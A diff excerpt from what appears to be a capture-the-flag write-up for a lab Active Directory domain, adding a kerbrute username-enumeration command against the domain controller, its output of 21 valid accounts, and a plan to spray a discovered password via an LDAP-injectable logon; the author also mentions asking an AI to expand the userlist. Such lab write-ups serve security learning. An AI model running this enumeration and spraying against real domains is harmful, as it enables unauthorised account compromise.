@@ -279,5 +279,45 @@ After continuous testing of this description field i know there is a password `c
 
 Ill spray this password against my current userlist, since this logon is vulnerable to LDAP injection it will use domain creds so a valid domain logon is also a valid website logon
 
+Ill ask AI to extend this userlist further
 
+```python
+kerbrute userenum --dc dc.hercules.htb -d hercules.htb usernames_extended.txt -t 30
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop
+
+2026/09/14 17:52:54 >  Using KDC(s):
+2026/09/14 17:52:54 >  	dc.hercules.htb:88
+
+2026/09/14 17:52:55 >  [+] VALID USERNAME:	ashley.b@hercules.htb
+2026/09/14 17:52:57 >  [+] VALID USERNAME:	elijah.m@hercules.htb
+2026/09/14 17:52:57 >  [+] VALID USERNAME:	fiona.c@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	heather.s@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	jacob.b@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	jennifer.a@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	jessica.e@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	joel.c@hercules.htb
+2026/09/14 17:52:58 >  [+] VALID USERNAME:	johanna.f@hercules.htb
+2026/09/14 17:52:59 >  [+] VALID USERNAME:	ken.w@hercules.htb
+2026/09/14 17:53:00 >  [+] VALID USERNAME:	mark.s@hercules.htb
+2026/09/14 17:53:00 >  [+] VALID USERNAME:	mikayla.a@hercules.htb
+2026/09/14 17:53:01 >  [+] VALID USERNAME:	natalie.a@hercules.htb
+2026/09/14 17:53:01 >  [+] VALID USERNAME:	patrick.s@hercules.htb
+2026/09/14 17:53:01 >  [+] VALID USERNAME:	ray.n@hercules.htb
+2026/09/14 17:53:01 >  [+] VALID USERNAME:	rene.s@hercules.htb
+2026/09/14 17:53:03 >  [+] VALID USERNAME:	stephanie.w@hercules.htb
+2026/09/14 17:53:03 >  [+] VALID USERNAME:	stephen.m@hercules.htb
+2026/09/14 17:53:03 >  [+] VALID USERNAME:	tanya.r@hercules.htb
+2026/09/14 17:53:03 >  [+] VALID USERNAME:	vincent.g@hercules.htb
+2026/09/14 17:53:03 >  [+] VALID USERNAME:	will.s@hercules.htb
+2026/09/14 17:53:05 >  Done! Tested 20170 usernames (21 valid) in 11.064 seconds
+```
+
+Found a few more users
 
